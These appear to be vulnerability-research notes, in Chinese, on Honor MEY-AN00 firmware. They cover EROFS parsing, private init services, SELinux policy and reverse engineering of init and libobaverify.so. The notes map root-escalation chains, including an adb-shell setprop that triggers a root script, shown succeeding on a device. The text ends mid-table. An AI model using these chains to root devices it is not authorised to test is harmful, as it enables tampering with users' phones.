# C 线成果 · 官方固件包全解析（2026-10-04 续）

> 承接 `2026-10-04-analysis.md`。本轮完成 **C 线主体**：官方 11.44 GB 完整包 → dload 三层 → 分区镜像 → EROFS 文件系统 → 荣耀私有组件枚举。

## 1 固件包结构（已定案）

`<HOME>\WorkBuddy\2026-09-26-09-04-37\MEY-AN00 10.0.0.175(C00E170R404P2)_Firmware_MagicOS 10.0_0501AJAB.zip`
= **11,442,338,777 B**，顶层仅 **7 条目**（`ReleaseDoc/` 4 + `Software/dload/` 3）。

`Software/dload/`（**全部 STORE 未压缩**，解包极快）：
| 文件 | 大小 |
|---|---|
| `update_sd_base.zip` | **9,326,813,703 B**（base 层，100 条目） |
| `MEY-AN00_all_cn/update_sd_preload_MEY-AN00_all_cn_R404.zip` | 2,120,024,825 B |
| `MEY-AN00_all_cn/update_sd_cust_MEY-AN00_all_cn.zip` | 194,715 B |

产物目录：`analysis/output/c_line/`（`update_sd_*.zip` + `image/`）。

## 2 ★★★ 内核 sha256 完美印证（决定性）

```
SOFTWARE_VER.mbn      = "MEY-LGRP1-CHN 10.0.0.175"   ← 与设备完全一致
boot.img kernel_size  = 37,128,704                     ← 与 Image-mey 等长
sha256(C-line kernel) = e8ce5dbf904ecb602b7c486ed365f0812d71d1696bddf79d188f6872906f9c79
sha256(Image-mey)     = e8ce5dbf904ecb602b7c486ed365f0812d71d1696bddf79d188f6872906f9c79
IDENTICAL = True
```
⇒ **`analysis/scratch/Image-mey` 就是官方固件包里的内核**。此前所有基于它推导的常量
（`MEY_DIRECT_BOOTID_PARENT=0xffffff802a29b090`、`LINK_*`、`MEY_PHYS_DELTA=0x28000000`、stage0/stageB 几何）
**全部获得官方物证背书**。脚本：`analysis/scripts/c_boot_cmp.py`。

## 3 分区镜像提取状态

`analysis/output/c_line/image/`（17 个已提取）：

| 镜像 | 大小 | 格式 | 状态 |
|---|---|---|---|
| `boot.img` | 100,663,296 | ANDROID! v4 | ✅ sha256 印证 |
| `vendor_boot.img` | 100,663,296 | VNDRBOOT v4 | ✅ B 线 .ko 来源 |
| `vendor.img` | 1,083,597,236 | sparse→EROFS | ✅ **已解析（775 文件/116 目录）** |
| `odm.img` | 1,737,773,484 | sparse→EROFS | ✅ **已解析（4171 文件/2290 目录）** |
| `vendor_dlkm.img` | 65,720,436 | sparse→EROFS | ✅ 已转 raw |
| `system_dlkm.img` | 15,433,844 | sparse→EROFS | ✅ 已转 raw |
| `kpatch.img` | 16,777,216 | 前 64B 全 0 | ⏳ 待定 |
| `init_boot.img` / `version.img` / `gpt_both0.bin` / `PTABLE_SUPER.mbn` | — | — | ✅ |
| `system.img` 3.96 GB / `product_h.img` 3.45 GB / `system_ext.img` / `preas.img` / `dtbo.img` / `recovery.img` | — | — | ⬜ 未提取 |

**全部镜像 sparse magic = `0xED26FF3A`**（Android sparse image, v1, blk=4096）。

## 4 ★★★ EROFS 解析器（自研，纯 Python）

`analysis/scripts/erofs.py` + `erofs_walk.py` + `erofs_scan2.py` + `sparse2raw.py`。

### 4.1 超级块（offset **1024**，128 B，与 kernel `erofs_fs.h` 逐字段核对）
```
+0   magic u32 = 0xE0F5E1E2
+8   feature_compat u32        （实测 vendor=7 / odm=7）
+12  blkszbits u8              （=12 ⇒ blk=4096）
+14  root_nid u16              （vendor=53 / odm=40）
+16  inos u64                  （vendor=7176 / odm=6656）
+36  blocks u32
+40  meta_blkaddr u32          （=0，meta 从 block 0 起）
+48  uuid[16]
+84  feature_incompat u32      （实测 =0x0000FFFF）
+88  available_compr_algs u16 / lz4_max_distance u16
```

### 4.2 踩坑记录（4 个关键修正）
1. **inline 数据起点** = `inode_off + inode_hdr + xattr_size`，
   其中 `erofs_xattr_ibody_size(icount) = sizeof(erofs_xattr_ibody_header)[12] + 4*(icount-1)`
   ⇒ **header 的 12 字节含在内，不可再加 inline meta 4 字节**。
   （实测：root nid=53 / icount=2 ⇒ 起点 = inode_off+32+16，delta=16 时 `nid=53 nameoff=228 ft=2` 完全吻合）
2. **dirent = 12 B 标准布局** `{__le64 nid; __le16 nameoff; __u8 file_type; __u8 reserved}`。
   ⚠️ 根目录 nid 都很小（53/66/69…）曾误判为 u32 变体；`/bin` 出现 `nid=0x01FAA97C` 才确认是 **u64**。
3. **名字无 `\0` 终止**：长度 = 下一 dirent 的 `nameoff` − 本条 `nameoff`（最后一条用 `\0` 截断 + 255 上限）。
   **dirent 区上限 = 第一条的 `nameoff`**（= 12 × n_dirents），否则会误把名字区当 dirent。
   注意目录 inode 的 `i_size` **可能远大于** dirents+names 真实长度（如 `/bin` size=12319 但只有 2 条 dirent）。
4. **两种 inode 布局**（`i_format & 1`）：
   - `version=0` → `erofs_inode_compact`（**32 B**）
   - `version=1` → `erofs_inode_extended`（**64 B**）← **odm 根目录就是这种**；
     `i_size` 变 u64 @+8，`i_uid/i_gid` 变 u32 @+24/+28，`i_nlink` u32 @+44

### 4.3 datalayout（`(i_format>>1)&7`）
| 值 | 含义 | 支持 |
|---|---|---|
| 0 | uncompressed flat (raw_blkaddr) | ✅ |
| 1 | compressed, full indexes | ⬜ |
| **2** | **uncompressed flat + tail-packing inline** | ✅ |
| 3 | compressed, compact indexes | ⬜（缺 z_erofs 解压） |
| 4 | chunk-based | ⬜ |

实测分布：**目录 100% 为 ds=2（inline）**；文件 ds=3(压缩最多) / ds=2 / ds=0 混杂。

### 4.4 压缩算法（`fs/erofs/erofs_fs.h`）
`Z_EROFS_COMPRESSION_LZ4=0 / LZMA=1 / DEFLATE=2`；每块算法在 `z_erofs_map_header.h_algorithmtype`
（bit0-3 = head1, bit4-7 = head2）。`z_erofs_map_header` = 8 B（`h_fragmentoff/h_idata_size` + `h_advise` + `h_algorithmtype` + `h_clusterbits`）。
`z_erofs_lcluster_index` = 8 B（`di_advise` / `di_clusterofs` / `blkaddr|delta[2]`）。

## 5 ★★★ 荣耀私有组件盘点（本轮新增攻击面）

### 5.1 vendor 分区（775 文件 / 116 目录）—— 荣耀私有极少
```
/app/com.honor.gpudrivers/com.honor.gpudrivers.apk            8,426
/etc/vintf/manifest/vendor.honor.hardware.security-service.xml  739  ★
/etc/vintf/manifest/vendor.honor.hardware.sensors.service.xml   297
/etc/vintf/manifest/vendor.honor.hardware.snpelaunch-service.xml 324
/etc/vintf/manifest/vendor.honor.hardware.thermal-service.xml   304
/etc/vintf/manifest/vendor.honor.hardware.tp.service.xml        286
/etc/vintf/manifest/vendor.honor.hardware.wifi.chipctrl.service.xml 307
/etc/vintf/manifest/vendor.honor.hardware.wifi.service.xml      423
/etc/wifi/hn_p2p_supplicant.conf 455 / /etc/wifi/hn_supplicant.conf 209
```
顶层字节分布：`/firmware` 46 MB / `/lib64` 8.7 MB / `/lib` 6.5 MB / `/apex` 5.8 MB / `/gpu/kbc` 4.8 MB / `/etc/selinux` 4.6 MB

### 5.2 ★★★ odm 分区（4171 文件 / 2290 目录）—— 荣耀私有主战场
顶层：`cust / etc / firmware / hn_odm / lib64 / ta`

**(a) `/hn_odm/MEY-AN00/`（设备专属目录）**
```
hn_odm/MEY-AN00/camera/watermark/{dm.png, frame/dm.png}
hn_odm/MEY-AN00/etc/permissions/*.xml（NFC/ESE/HCE 等 10 个）
hn_odm/MEY-AN00/nfc/nfc_rf_param/{GdxNfcRfParam.xml, nfcConfig.xml, ...}
```

**(b) `/lib64/` 29 条 —— 荣耀私有相机算法库**
```
libhonor_ai_capture.so                 103,712
libhonor_img_quality_assessment.so     101,272
libhonor_magicmoment.so                283,048
libhonor_tof_interface.so              400,056
libremosaiclib.so                    9,281,320
libopencv_core.so / libopencv_imgproc.so / libmoonsr.so / libvdstv2.so
libyVignetting.so / libygama.so / libsw3dlut.so / libframeSelectGyroOIS.so ...
```

**(c) ★★★ `/etc/init/` —— 荣耀私有 HAL**
```ini
# android.hardware.security.keymint-service.strongbox-hn.rc (354 B)
on property:sys.boot_completed=1
    setprop remote_provisioning.hostname remoteprovisioning.googleapis.com
    setprop remote_provisioning.strongbox.rkp_only true

service vendor.keymint-strongbox /vendor/bin/hw/android.hardware.security.keymint-service.strongbox-hn
    class early_hal
    user jc_strongbox          ← ★ 专有 SELinux 用户
    group nfc
    file /dev/kmsg w           ← ★ 内核日志写权限
```
```ini
# strongbox_model.rc (96 B)
on early-init
    setprop ro.strongbox.manufacturer Goodix
    setprop ro.strongbox.model GSN22
```
⇒ **Goodix GSN22 强盒芯片 + 荣耀私有 keymint HAL（`early_hal` 类）+ 专有用户 `jc_strongbox`**。

**(d) ★★★ `/ta/` —— TEE Trusted Applications（7 个）**
```
a423e43d-abfd-441f-b89d-39e39f3d7f65libalgorithm1261.so.sec   6,647,920
a423e43d-abfd-441f-b89d-39e39f3d7f65libalgorithm4654.so.sec   4,317,440
e8014913-e501-4d44-a9d6-058ec3b93b90.sec                        161,632
fd1bbfb2-9a62-4b27-8fdb-a503529076af.sec                         55,328
fpkit_f0301300_ta.sec                                         4,914,608   ← 指纹 TA
fpkit_f1200200_ta.sec                                         3,582,208   ← 指纹 TA
ifaa_key_product_ta.sec                                         276,160   ← IFAA 密钥 TA
```

**(e) 其他**
```
/etc/cellular/QC_Honor_HGR_Commercial_MEY.pfm    4,500
/cust/{def,claro,docomo}/{jp,us,la}/xml/gpsconfig.xml + ons.bin 275,088
```

## 6 与内核侧（A/B 线）的交叉印证

| 内核侧（B 线） | 用户态对应（C 线） | 状态 |
|---|---|---|
| `honor_scm.ko`（System Cache Mgmt, 7 个 reclaim hook） | 未找到用户态客户端 | 纯内核 |
| `honor_tsa.ko`（`/proc/honor_tsa_info/stack_info/ioctl` oracle） | 未找到用户态调用者 | 纯内核 |
| `rcc.ko`（`vmalloc_node_bypass`/`vfree_bypass`） | 未找到用户态客户端 | 纯内核 |
| `kernel_stp.ko`（`/proc/kernel_stp`） | 未找到用户态客户端 | 纯内核 |
| `honor_scm.ko` vintf | `vendor.honor.hardware.security-service.xml` ★ 新发现 | 待读 |
| TEE 侧 | `/ta/fpkit_*_ta.sec`（指纹） / `ifaa_key_product_ta.sec` | 新攻击面 |

**★ 结论**：荣耀私有内核模块（rcc/honor_scm/honor_tsa/kernel_stp）**全部是纯内核侧**，
用户态无直接客户端 ⇒ **无法从 app 侧直接触达**，这与 B 线「闭源 vendor 模块无开源对应」一致。

## 7 下一步

1. **⬜ ds=3 压缩解压**：实现 `z_erofs` compact index 解析 + LZ4 解压
   （`analysis/scripts/lz4_decompress.py` 已有 LZ4 block/legacy frame），
   以提取 `/vendor/bin/hw/android.hardware.security.keymint-service.strongbox-hn`（疑似 ds=3）。
2. **⬜ 读 `vendor.honor.hardware.security-service.xml`**（ds=2，可直接读）。
3. **⬜ 提取 `system_ext.img` / `system.img`**（荣耀私有 so 大量在此）。
4. **⬜ `/ta/*.sec` 结构分析**（Goodix 指纹 TA + IFAA TA）。
5. **⬜ `kpatch.img`**（16 MB，前 64 B 全 0）格式确认 —— 若为内核热补丁，可能含绕过补丁的线索。

---

# ★★★ 补充（2026-10-04 晚 · 第二轮）：EROFS ds=3 提取器修复 + 私有 init/服务风险审计

## 8 ★★★ 根因级修复：EROFS ds=3 "全零文件" 真相

**此前结论（错误）**：`init.honor.iaware.a53.rc` / `init.honor.update.rc` / `init.honor.os.common.rc`
"在本镜像中零填充"。

**真因**：**不是零填充，是提取器 bug** —— 少数 pcluster 的压缩流**不从 `pblk*bs` 开始**
（`pblk` 指向的物理块前部残留**前一个 pcluster 的尾部**，两 pcluster **共享同一块**）。

**实证（`init.honor.os.common.rc`, nid=50114173, ds=3, size=14313）**：
```
iloc = 0x5f95cfa0,  icount=2 -> xattr_isize=16,  ebase = 0x5f95cfd8
map header @ iloc+0x30: h_advise=0x0001 (ADVISE_COMPACTED_2B), alg=0(LZ4), clu=0
index  @ ebase: 00100220 01fd0500 0220e907 02fd0500   (4 slots, totalidx=4, c4bi=2)
lcn0 HEAD1 cfs=0    pblk=392450
lcn1 NONHEAD delta=1  -> lcn0
lcn2 NONHEAD delta=2  -> lcn0
lcn3 PLAIN  cfs=2025 pblk=392451
```
物理块 392450：`off 0..122` 全零；**`off 123` 起为 LZ4 流**
→ 从 `+123` 解压得 **14313 字节，恰好等于 i_size** ✓ 内容为完整 init rc 文本。

**修复**（`analysis/scripts/erofsz3.py` 新增 `_read_pcluster()`）：
1. 规范尝试：读 `plen`，`_fixup_insize` 后 LZ4；
2. 扩窗尝试：读 `plen + blk_sz`（流跨块）；
3. **块内扫描**：找到首个能解出 `>= want` 字节的起点。

**修复后验证**：`system_ext.raw` 中 `init.honor.iaware.a53.rc`(4918) / `init.honor.update.rc`(4183) /
`init.honor.camera.rc`(491) / `init.honor.os.a53.rc`(3017) / `oba_debug.sh`(1493) /
`fb_dfr_bypass.sh`(2225) **全部 100% 恢复，`all-zero=False`**。

## 9 ★★★ 荣耀私有 init 服务全景（root 运行的攻击面）

### 9.1 `/system/etc/init/init.honor.os.common.rc`（14,313 B，**本轮首次成功提取**）
| 服务 | 用户 | 命令 | 触发 |
|---|---|---|---|
| **`oba_service`** | **root** | `/system/bin/sh /system_ext/bin/oba_debug.sh` | `disabled`，`seclabel u:r:oba_service:s0` |
| **`mini_bugreport`** | **root** | `/system/bin/dumpstate -m -o /data/log/press10/mini_bugreport` | **`keycodes 116 193`**（物理按键） |
| **`storage_info`** | **root** | `/vendor/bin/storage_info` | `restart_period 600`（常驻） |
| **`hwemerffu`** | **root** | `/vendor/bin/hwemerffu` | `on early-boot`，`class main` |
| `themes_folder_chown` | **root** | `chown -R system:media_rw /data/themes/{user,temp}` | disabled |
| `themes_folder_chmod` | **root** | `chmod -R 0775 /data/themes/{user,temp}` | disabled |
| `fb_bypass` | system | `sh /system_ext/bin/fb_dfr_bypass.sh` | disabled |
| `odmf-data-chgrp` | system | `/system/bin/odmf-data-chgrp.sh` | disabled |

**★ 大量 `/data/update/**` 目录以 `0777` 创建**（`mkdir /data/update 0777 system cache`、
`/data/update/{accessory,HnOUC,cloud_rom,OUC,vendorcota}` 等 20+ 个）⇒ **任何 app 可写**。

### 9.2 `/system/etc/init/init.honor.update.rc`（4,183 B，**本轮首次成功提取**）
```ini
on init
    restorecon /dev/block/bootdevice/by-name/kpatch
    parse_kpatch /patch_hn/kpatch/insmod_list        ← ★★★ init 内建命令，会 insmod 内核模块
    mkdir /mnt/update_engine 0700 root root
```
**root 服务**：`cust_from_init`(/system/bin/cust_init) / `cota_verifier`(/system/bin/cota_verify)。
`setprop` 目标：`vold.crypto_unencrypt_updatedir` / `sys.mount_patch` 等。

### 9.3 `/system/etc/init/init.honor.os.a53.rc`（3,017 B，**本轮首次成功提取**）
写 `/proc/hung_task/*` 5 处；`setprop persist.service.hdb.enable` 等。

### 9.4 `/system/etc/init/init.honor.iaware.a53.rc`（4,918 B，**本轮首次成功提取**）
cgroup/iolimit 初始化；`mkdir /data/log/iaware chown root:system chmod 770`。

## 10 ★★★ 高风险脚本（root/特权上下文）

### 10.1 `oba_debug.sh`（1,493 B）—— **root 运行的 OTG 块设备探测**
```sh
DIRECTORY="/dev/block/*sd*"
MAKE_OTG_PROP="sys.oba.make.otg"
if [[ $make_otg_prop == true ]]; then
    get_block_diff   # ls $DIRECTORY ; sleep 20s ; ls ; diff
    get_block_path   # 提取新增块设备 -> setprop sys.oba.block.name
    rm -rf /data/oba/{blocklist,blocklist_with_usb,diffblock}.txt
fi
```
**SELinux 授权（`system_ext_sepolicy.cil`）**：
```
(allow oba_service oba_prop (property_service (set)))
(allow oba_service oba_service_exec (file (read getattr map execute open entrypoint)))
(allow oba_service block_device (dir (read open search)))
(allow oba_service block_device (blk_file (getattr)))
(allow oba_service logcat_data_file (file (ioctl read write create getattr lock append map unlink open ...)))
★ (allow shell oba_prop (property_service (set)))          ← shell 可写 oba_prop！
★ (allow init  oba_prop (property_service (set)))
★ (allow vold  oba_prop (property_service (set)))
```
⇒ **若 `sys.oba.make.otg` ∈ `oba_prop` 类型，则 `shell` / `vold` 可置位并触发 root 脚本**。
（待确认属性归属；`oba_service` 需 `init` 显式 `start`。）

### 10.2 `usb_update_daemon.sh`（301 B，`/vendor/etc/`）—— **root 无限循环，触发 `reboot usbupdate`**
```sh
USB_UPDATE_FLAG="/sys/kernel/usb_update"
while true; do
  if [ -e $USB_UPDATE_FLAG ]; then
      setprop sys.powerctl reboot,usbupdate
  fi
  sleep 1
done
```
⇒ 只要能创建 `/sys/kernel/usb_update`，即可强制设备进入 **usbupdate/下载模式**。

### 10.3 `fb_dfr_bypass.sh`（2,225 B，`/system_ext/bin/`）—— system 上下文
写 `/sys/class/fb_vadj/bypass`（`BYPASS_NODE_CMD=2`）、`persist.fb.bypass.need`；
日志写 `/dev/kmsg`。由异常重启计数（30 天 ≥4 次）驱动。

## 11 私有 SELinux 域与类型（新增清单）

**在 `system_ext_sepolicy.cil` 中定义的类型（部分，profile 后缀无 `_202404`）**：
```
dlupserver / dlupserver_exec / fcme / fcme_exec / dtshpxservice / dtshpxservice_service
dubai_service / dubai_log_device / dubai_device / dubai_data_file / dubai_ce_file
distributedfiledaemon / distributedfileservice / distributedfile / mdfs_data_file
fault_notify_service / fb_bypass / fb_bypass_exec / oba_service / oba_prop / oba_service_exec
dpm_device / proc_netstat / proc_ModemNv / proc_wakeup_sources
sysfs_honor_hung_task_topapp / sysfs_honor_hung_task_jankproc
sysfs_fmps_version_current / sysfs_dex_pss_version_current / dex_pss_device
systemfeature_data_file / hw_cust_file / cust_file / data_system_iaware / data_system_hiview
hwinstaller_data_file / dmd_socket / limit_current / hwsystemmanager_data_file / push_data_file
app_acc_file / theme_data_file / sysfs_dp_pc / fac_service_prop / filebackup_socket / sysfs_fmps_version_current
```
**域权限（低权限，非提权面）**：
- `dlupserver`：仅 `tcp_socket(create/bind/listen/accept/setopt)` + `capability(net_raw)` +
  `port(tcp_socket name_bind)` + `node(tcp_socket node_bind)` ⇒ **可 bind 任意端口**（非提权）。
- `fcme`：`tcp_socket` + `capability(net_raw)` + **`hal_hwfactoryinterface (binder (call))`**
  ⇒ 可调用**工厂模式 HAL**（`u:r:fcme:s0`，root 运行 `oneshot`）。
- `dtshpxservice`：可 binder 到 `system_server`/`mediaserver`/`audioserver`/`platform_app`/`system_app`，
  可 open/ioctl `audio_device` ⇒ **音频 HAL 面**。

## 12 本轮结论（风险分级）

| 风险 | 项 | 说明 |
|---|---|---|
| **高** | `parse_kpatch /patch_hn/kpatch/insmod_list` | init 内建命令 insmod 内核模块；`/patch_hn` 若可写 ⇒ **内核代码执行** |
| **高** | `swapon_all`/`sys.powerctl` 类属性 | `usb_update_daemon.sh` 可触发 `reboot usbupdate` |
| **中高** | `shell` 可写 `oba_prop` → root `oba_debug.sh` | 待确认 `sys.oba.make.otg` 归属；纯用户态，若成立则**无需内核漏洞** |
| **中高** | `mini_bugreport` root `dumpstate` by `keycodes` | 物理按键触发，输出目录 0770 |
| **中** | 20+ 个 `/data/update/**` 0777 目录 | 任意 app 可写，影响 OTA/COTA 流程 |
| **中** | `fcme` → `hal_hwfactoryinterface` binder | 工厂 HAL 调用面 |
| **低** | `dlupserver` / `dtshpxservice` / `fb_bypass` | 仅网络/音频面，非提权 |

**★ 下一步优先级**：① 确认 `sys.oba.make.otg` 的 SELinux 属性类型（决定 10.1 是否成立）；
② 审计 `/patch_hn/` 分区与 `kpatch` 的写权限（决定 12-高 项）；③ `odm.raw`/`product_h.raw` 全树扫描。

## 13 ★★★ 决定性发现：属性驱动的 root 代码执行框架（含实测）

### 13.1 `init.honor.os.common.rc` 的 oba 触发段（L228-266 原文）
```ini
service oba_service /system/bin/sh /system_ext/bin/oba_debug.sh
    class core
    oneshot
    disabled
    user root                    ← ★★★ 以 root 运行
    group system root
    seclabel u:r:oba_service:s0

on property:sys.oba.make.otg=true && property:ro.oba.whenlocked=true
    start oba_service            ← ★★★ 属性触发 root sh

on post-fs-data && property:ro.oba.whenlocked=true
    mkdir /data/oba ; chmod 0775 /data/oba ; chown system system /data/oba

on property:sys.oba.block.name=*
    make_oba_otg                 ← ★ init 私有内建命令

on property:sys.oba.copy.start=true
    oba_file_verify              ← ★ init 私有内建命令
```

### 13.2 属性类型（`system_ext_property_contexts`，407 行）
```
sys.oba.make.otg    u:object_r:oba_prop:s0        ← 确认属于 oba_prop
sys.oba.block.name  u:object_r:oba_prop:s0
sys.oba.copy.start  u:object_r:oba_prop:s0
oba.debug_on        u:object_r:oba_prop:s0
ro.oba.whenlocked   u:object_r:oba_whenlock_prop:s0   ← 独立类型（仅 init 可写）
```

### 13.3 `oba_prop` 的写权限（`system_ext_sepolicy.cil`）
```
(allow shell       oba_prop (property_service (set)))    ← ★★★ adb shell 可写
(allow oba_service oba_prop (property_service (set)))
(allow init        oba_prop (property_service (set)))
(allow vold        oba_prop (property_service (set)))
```

### 13.4 ★★★ 设备实测（MEY-AN00，2026-10-04）
```
$ getprop ro.oba.version      -> 20260807113313_OBA_VERSION   (已定义)
$ getprop ro.oba.whenlocked   -> (空)                          ← 未设置！
$ getprop sys.oba.make.otg    -> (空)
$ id                          -> uid=2000(shell) context=u:r:shell:s0
$ setprop sys.oba.make.otg true ; echo rc=$?
   rc=0                                                        ← ★★ 写成功！
$ getprop sys.oba.make.otg    -> true                          ← 已生效
```
**⇒ `shell` 确实能写 `sys.oba.make.otg`。** 但 `start oba_service` 还需
`ro.oba.whenlocked=true`，**该属性在当前（正常锁定）启动下未设置**。

### 13.5 判定
- **链条完整存在**：`shell` → `setprop sys.oba.make.otg=true` → `start oba_service`（root sh）
- **当前阻塞点**：`ro.oba.whenlocked` 为空。它**在全部已提取镜像中只被读取、从未被设置**
  ⇒ 由 **`vendor_init` / bootloader 在启动早期**按**设备锁定/OBA 模式**注入
  （`/proc/bootconfig` shell 无权限读取，无法进一步确认）。
- **含义**：该路径在**正常锁定启动**下不通；在 **OBA（开箱激活/工厂）模式**下应通。
  **若能通过任何方式在启动早期令 `ro.oba.whenlocked=true`
  （如修改 bootconfig / 刷入自定 vbmeta-cmdline），即为一条完整的 root 路径。**
- **另一条不依赖 `whenlocked` 的路径**：`sys.oba.block.name=*` → `make_oba_otg`
  与 `sys.oba.copy.start=true` → `oba_file_verify`
  **均无 `whenlocked` 前置条件** ⇒ **只要 `shell` 能设置这两个属性（同属 `oba_prop`），
  就会触发 init 私有内建命令**（`make_oba_otg` / `oba_file_verify` 的具体行为待分析
  —— 它们是 init 二进制中的荣耀私有扩展，**未在内核开源包中**）。

### 13.6 ★ 本轮最高价值结论（更新 12 节风险表）
| 风险 | 项 | 判定 |
|---|---|---|
| **高（受 whenlocked 阻塞）** | `sys.oba.make.otg` → root `oba_service` | 链完整，需 `ro.oba.whenlocked=true` |
| **★★ 高（无前置条件）** | `sys.oba.block.name` / `sys.oba.copy.start` → init 内建 `make_oba_otg` / `oba_file_verify` | **待分析这两个命令的语义**；若其行为可控 ⇒ root |
| **高** | `parse_kpatch /patch_hn/kpatch/insmod_list` | init insmod，`/patch_hn` 写权限待查 |

**★ 下一步（优先级 P0）**：逆向 **`/system/bin/init`（荣耀定制版）**，
定位 `make_oba_otg` / `oba_file_verify` / `parse_kpatch` / `load_system_props_for_cota` /
`distribute_init` 这 5 个私有内建命令的实现 ⇒ 判定能否造成可控的 root 操作。

---

## 14 ★★★★ EROFS 解析器终极缺陷修复（2026-10-04 深夜，本轮最大突破）

### 14.1 现象与排查历程
- **现象**：`/system/bin` 只解析出 **55 条**（`toybox`…`ziptool`，全为 t–z 开头），
  **`init` / `app_process64` / `logcat` 等全部缺失**；`/system/lib64` 只 85 条（应 1297）。
- **误判修正 3 次**：
  1. ❌ 以为"每 4096 块独立 dirent+names"（第一次改 `list_dir`）→ 仍 55
  2. ❌ 以为 `nameoff` 需 `& 0xFFF` 掩码（照 `namei.c` 的 `nameoff_from_disk`）→ 仍 55
  3. ✅ **真因是 `file_data()` 对 `ds=2` 的数据布局彻底搞反**

### 14.2 ★★★★ 真根因（内核 `fs/erofs/data.c:erofs_map_blocks_flatmode` 逐行对齐）
`EROFS_INODE_FLAT_INLINE`（datasource=2）的**真值布局**：
```c
nblocks = erofs_iblks(inode) = DIV_ROUND_UP(i_size, blksz);
lastblk = nblocks - tailendpacking;          // tailendpacking = true ⇒ lastblk = nblocks-1
if (offset < erofs_pos(sb, lastblk)) {        // 属于「非末块」
    m_pa   = erofs_pos(sb, vi->raw_blkaddr) + m_la;   // ← 从 i_u.raw_blkaddr 起的连续物理块
    m_plen = erofs_pos(sb, lastblk) - offset;
} else {                                      // 属于「末块」= inline
    m_pa   = erofs_iloc(inode) + vi->inode_isize + vi->xattr_isize + erofs_blkoff(sb, offset);
    m_plen = inode->i_size - offset;          // ← 且必须不跨元数据块边界，否则 EFSCORRUPTED
}
```
⇒ **前 (nblocks−1) 个整块来自 `i_u.raw_blkaddr` 的连续物理块；只有最后一块是 inline（在 inode 之后）**。

**我方旧实现是反的**（把 inline 放最前），导致所有多块文件/目录全部错位：
- 实测 `/system/framework`（nid=756, size=8425, iblks=3）：
  - `inline 336B`（实为**下一个 inode 的字节**） + `i_u` 块 = 错位数据
  - 正确：块 0/1 = `i_u, i_u+1`；块 2（233B）= inline @ `iloc+32+16`

### 14.3 修复与验证（`analysis/scripts/erofs.py::file_data`）
修复后（通过公共 API）：
| 路径 | 修复前 | **修复后** |
|---|---|---|
| `/system/bin` | 55 | **465** ✅（含 `init`/`app_process64`/`logcat`/`cust_init`/`idmap2`/`kcmdlinectrl`） |
| `/system/lib64` | 85 | **1,297** ✅ |
| `/system/framework` | 7 | **228** ✅ |
| `/system/etc/init` | — | **84** ✅ |
| `/system/priv-app` | — | **106** ✅ |
| `/system/app` | 107 | 107 ✓（单块，本就正确） |

**至此 `system.raw`（4.05 GB）全树可完整解析。**

---

## 15 ★★★★ `/system/bin/init` 逆向：5 个私有内建命令全部落地（P0 完成）

### 15.1 提取
```
/system/bin/init  =  4,157,648 B  ELF64 AArch64 (stripped)
sha256 = 7a85d29ec2497b1ddefaf192df1d7273...
产物：analysis/output/c_line/init_bin/init
```
（`/init` 是符号链接 → `/system/bin/init`，nx 16B）

### 15.2 ★★★ 5 个私有内建命令字符串**全部命中**（唯一，各 1 处引用）
| 命令 | 字符串 fileoff | VA | `adrp+add` 引用点 |
|---|---|---|---|
| `make_oba_otg` | 253373 | `0x3ddbd` | `0x1412bc` |
| `oba_file_verify` | 131594 | `0x2020a` | `0x141318` |
| `parse_kpatch` | 212941 | `0x33fcd` | `0x1431fc` |
| `distribute_init` | 143549 | `0x230bd` | `0x1429a8` |
| `load_system_props_for_cota` | 131623 | `0x20227` | （表内，未单独 adrp） |

⇒ **5 条命令名全部存在于**（此前只是"init rc 里见过"），现在**在二进制中确认**，
且**各自只有 1 处代码引用**（内建命令注册表区 `0x1412xx–0x1432xx`）。

### 15.3 ★★★★ handler 定位与语义解码
注册条目模式（4 条同构）：
```
adrp x1, <"cmdname"> ; add x1,x1,#lo
add  x0, sp, #<dest>           ; 构造/赋值
bl   0x12d880                  ; 辅助构造
adr  x9, <handler-thunk>       ; ← 真正的处理函数指针
```
| 命令 | handler thunk | 关键行为（反汇编） |
|---|---|---|
| `oba_file_verify`(?) | **`0x149f6c`** | **`opendir("/dev/block/")` → `readdir` → `strstr(name,"sd")`** + `strstr("ObaFileVerifyWhenLock")` + `"libobaverify.so"` |
| （另一条） | `0x149168` | 9 帧大函数（~0x2d0 栈），引用 `0x28c23` 字符串 |

### 15.4 ★★★★★ `make_oba_otg` 语义（决定性突破）
`0x149f6c` 反汇编 + 字符串解析：
```
opendir("/dev/block/")                       ← 枚举块设备
readdir(...) → strstr(entry_name, "sd")      ← 匹配 /dev/block/sd*（OTG/SD 卡）
dlopen(... "libobaverify.so" ...)            ← 加载验证库
... strstr("ObaFileVerifyWhenLock")          ← 调用该导出符号
```
⇒ **`make_oba_otg` = 扫描 `/dev/block/sd*`（外接 OTG/SD 块设备）并调用
`libobaverify.so` 的 `ObaFileVerifyWhenLock`**。

### 15.5 ★★★★★ 提取并分析 `libobaverify.so`（root 权限运行）
```
路径：/system/lib64/libobaverify.so
大小：15,400 B  ELF64 AArch64  sha256=a21b8c3be12afb4b00a8c1efa1075be6...
产物：analysis/output/c_line/init_bin/libobaverify.so
```
**导出符号**：
```
ObaVerify::FindOtgObaFilePath()   _ZN9ObaVerify18FindOtgObaFilePathEv
ObaVerify::ObaFileVerify()        _ZN9ObaVerify13ObaFileVerifyEv
ObaFileVerifyWhenLock             （C 符号，被 init 直接调用）
```
**依赖库**：`libc.so` / **`libcrypto.so`** / `libcutils.so` / `libc_secshared.so` / `libc++.so` / `libdl.so`

**完整验证链（字符串 + 导入符号还原）**：
```
1. opendir/readdir 扫描  /mnt/media_rw/            ← ★ 外接存储（攻击者可控介质）
2. sprintf_s(path, "%s%s/honor_oba.cfg", ...)      ← 拼路径
   已知常量路径：/storage/sdcard1/honor_oba.cfg
3. property_get("ro.oba.version")                  ← 读版本
4. fopen + fread 读 honor_oba.cfg
5. property_get("oba.debug_on")                    ← 调试开关
6. RSA_public_key_from_bytes(...) + RSA_public_decrypt(...)   ← ★ RSA 签名验证（libcrypto）
7. 校验 "OBA_VERSION_0x0xa1b2c3d4" 版本标志
8. 成功 → property_set(...) / klog_write(...)      ← ★ 写属性（root！）
```
**错误日志前缀**：`<3>OBA_LOGCAT: ...`（`klog_write` 直写内核日志）

### 15.6 ★ 安全评估（`libobaverify.so`）
| 项 | 观察 | 风险 |
|---|---|---|
| 数据来源 | `/mnt/media_rw/`、`/storage/sdcard1/` 外接介质 | **可控介质**，但需 **RSA 私钥签名** |
